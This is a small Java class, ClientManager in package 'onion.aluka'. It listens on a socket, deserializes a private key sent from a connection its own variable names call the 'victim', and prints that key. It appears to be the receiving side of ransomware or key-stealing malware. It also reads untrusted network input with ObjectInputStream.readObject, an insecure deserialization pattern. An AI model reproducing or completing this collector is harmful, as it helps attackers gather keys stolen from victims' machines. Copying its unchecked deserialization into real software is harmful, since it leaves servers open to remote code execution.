package onion.aluka;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.security.PrivateKey;
import java.security.PublicKey;

public class ClientManager implements Runnable {

	private Socket socket;
	private PublicKey publicKey;
	private PrivateKey privateKey;

	public ClientManager(Socket socket,PublicKey publicKey,PrivateKey privateKey) {
		System.out.println("Received");
		this.socket = socket;
		this.publicKey = publicKey;
		this.privateKey = privateKey;
	}

	@Override
	public void run() {
		try {
			ObjectInputStream privateKeyFromVictim = new ObjectInputStream(socket.getInputStream());
			PrivateKey privateVictimKey = (PrivateKey)privateKeyFromVictim.readObject();
			System.out.println(privateVictimKey);
		} catch (IOException | ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
